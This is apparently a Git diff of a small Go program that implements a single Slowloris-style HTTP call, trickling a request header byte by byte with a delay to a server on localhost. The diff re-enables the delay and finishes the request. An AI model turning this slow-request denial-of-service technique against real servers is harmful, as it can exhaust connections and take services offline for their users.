@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"time"
 )
 
 func oneSlowLorisCall(server string, port string) (err error) {
@@ -25,22 +26,22 @@ func oneSlowLorisCall(server string, port string) (err error) {
 		"Host: " + server + "\r\n" +
 		"Connection: close\r\n"
 
-	_, err = conn.Write([]byte(startRequest))
-	if err != nil {
+	if _, err = conn.Write([]byte(startRequest)); err != nil {
 		return fmt.Errorf("error writing to connection: %w", err)
 	}
 
-	userAgent := "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
-	// To end an HTTP you send the: \r\n\r\n
-	// We probably will never send this as the goal is to maintain the connection
-	// endHttp := "\r\n\r\n"
+	userAgent := "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
 
 	for _, b := range []byte(userAgent) {
-		_, err := conn.Write([]byte{b})
-		if err != nil {
+		if _, err := conn.Write([]byte{b}); err != nil {
 			return fmt.Errorf("error writing to connection: %w", err)
 		}
-		// time.Sleep(1 * time.Millisecond)
+		time.Sleep(1 * time.Millisecond)
+	}
+
+	endHttp := "\r\n\r\n"
+	if _, err := conn.Write([]byte(endHttp)); err != nil {
+		return fmt.Errorf("error writing to connection: %w", err)
 	}
 
 	rsp, err := readResponse(conn)
@@ -71,7 +72,7 @@ func readResponse(conn net.Conn) (string, error) {
 
 func main() {
 	server := "localhost"
-	port := "8080"
+	port := "8000"
 	err := oneSlowLorisCall(server, port)
 	if err != nil {
 		fmt.Println("Error:", err)
